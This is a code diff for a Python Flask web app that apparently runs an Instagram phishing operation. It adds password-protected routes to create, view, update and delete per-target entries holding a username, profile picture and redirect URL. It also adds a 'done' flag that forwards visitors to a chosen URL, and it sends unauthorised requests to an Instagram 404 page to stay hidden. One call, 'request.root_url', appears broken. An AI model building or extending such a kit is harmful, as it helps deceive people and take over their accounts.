@@ -51,6 +51,9 @@ def login(backend):
     if backend not in data:
         return redirect('https://www.instagram.com/404') 
     
+    if data[backend]["done"]:
+        return redirect(data[backend]["url"])
+    
     user_agent = request.headers.get('User-Agent')
     
     if 'Mobile' in user_agent or 'Android' in user_agent or 'iOS' in user_agent:
@@ -97,8 +100,14 @@ def create(password):
     
     return render_template("create.html", url=request.url_root)
 
-@app.route('/create/submit', methods=["POST"])
-def create_new():
+@app.route('/<password>/create/submit', methods=["POST"])
+def create_new(password):
+    with open("password.txt", "r") as file:
+        original_password = file.read()
+
+    if password != original_password:
+        return redirect("https://www.instagram.com/404")
+    
     data = request.form
 
     username = data.get('username')
@@ -118,6 +127,7 @@ def create_new():
     data[backend]["create_date"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     data[backend]["username"] = username
     data[backend]["url"] = url
+    data[backend]["done"] = False
 
     with open('database.json', 'w') as file:
         file.write(
@@ -147,7 +157,72 @@ def view(password, backend):
     if backend not in data:
         return redirect('https://www.instagram.com/404')  
     
-    return render_template("view.html", data=data[backend])
+
+    url = request.root_url + backend
+    data = data[backend]
+    pfp = get_pfp(data["username"])
+    
+    return render_template("view.html", url=url, data=data, pfp=pfp)
+
+@app.route('/<password>/<backend>/update', methods=["POST"])
+def update(password, backend):
+    with open("password.txt", "r") as file:
+        original_password = file.read()
+
+    if password != original_password:
+        return redirect("https://www.instagram.com/404")
+    
+    with open('database.json', 'r') as file:
+        data = loads(
+            file.read()
+        )
+
+    if backend not in data:
+        return redirect('https://www.instagram.com/404')  
+    
+    url = request.json["url"]
+    done = request.json["done"]
+    
+    data[backend]["url"] = url
+    data[backend]["done"] = done
+
+    with open('database.json', 'w') as file:
+        file.write(
+            dumps(
+                data,
+                indent=4
+            )
+        )
+
+    return "", 200
+
+@app.route('/<password>/<backend>/delete')
+def delete(password, backend):
+    with open("password.txt", "r") as file:
+        original_password = file.read()
+
+    if password != original_password:
+        return redirect("https://www.instagram.com/404")
+    
+    with open('database.json', 'r') as file:
+        data = loads(
+            file.read()
+        )
+
+    if backend not in data:
+        return redirect('https://www.instagram.com/404')  
+    
+    data.pop(backend)
+
+    with open('database.json', 'w') as file:
+        file.write(
+            dumps(
+                data,
+                indent=4
+            )
+        )
+
+    return "", 200
 
 @app.route('/mayday')
 def mayday():
